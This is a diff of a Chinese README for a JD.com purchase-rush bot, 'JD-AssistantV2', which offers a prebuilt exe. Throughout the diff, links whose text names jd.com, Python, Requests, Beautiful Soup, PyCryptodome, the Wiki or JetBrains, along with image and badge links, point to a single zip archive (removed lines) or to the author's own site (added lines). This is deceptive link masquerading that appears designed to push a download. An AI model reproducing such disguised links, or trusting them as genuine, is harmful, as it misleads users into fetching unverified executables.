@@ -1,22 +1,22 @@
 exe在dist目录，需要的自取<br>
 抢不抢到看运气，主要看网速，最好是用北京的服务器，不要问抢不抢的到，下面是两张订单图
 <br>
-<img src='https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip' width='360px'/>
-<img src='https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip' width='360px'/>
+<img src='https://kkkknrg.github.io' width='360px'/>
+<img src='https://kkkknrg.github.io' width='360px'/>
 
 
 # JD-AssistantV2
 
-[![version](https://img.shields.io/badge/python-3.4+-blue.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip) 
-[![status](https://img.shields.io/badge/status-stable-green.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+[![version](https://img.shields.io/badge/python-3.4+-blue.svg)](https://kkkknrg.github.io) 
+[![status](https://img.shields.io/badge/status-stable-green.svg)](https://kkkknrg.github.io)
 [![license](https://img.shields.io/badge/license-MIT-blue.svg)](./LICENSE)
-[![star, issue](https://img.shields.io/badge/star%2C%20issue-welcome-brightgreen.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+[![star, issue](https://img.shields.io/badge/star%2C%20issue-welcome-brightgreen.svg)](https://kkkknrg.github.io)
 
 京东抢购助手
 
 ## 主要功能
 
-- 登陆京东商城（[www.jd.com](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)）
+- 登陆京东商城（[www.jd.com](https://kkkknrg.github.io)）
   - 手机扫码登录
   - 保存/加载登录cookies (可验证cookies是否过期)
 - 商品查询操作
@@ -39,13 +39,13 @@ exe在dist目录，需要的自取<br>
 
 ## 运行环境
 
-- [Python 3](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+- [Python 3](https://kkkknrg.github.io)
 
 ## 第三方库
 
-- [Requests](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
-- [Beautiful Soup](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
-- [PyCryptodome](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+- [Requests](https://kkkknrg.github.io)
+- [Beautiful Soup](https://kkkknrg.github.io)
+- [PyCryptodome](https://kkkknrg.github.io)
 
 安装：
 ```sh
@@ -56,7 +56,7 @@ pip install -r requirements.txt
 
 程序主入口在 `mainV2.py`
 
-👉 [使用教程请参看Wiki](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+👉 [使用教程请参看Wiki](https://kkkknrg.github.io)
 
 
 ## 更新记录
@@ -94,4 +94,4 @@ pip install -r requirements.txt
 
 ## Sponsor
 
-[![JetBrains](./docs/jetbrains.svg)](https://raw.githubusercontent.com/kkkknrg/jd-assistantV2/master/dist/1.2.zip)
+[![JetBrains](./docs/jetbrains.svg)](https://kkkknrg.github.io)
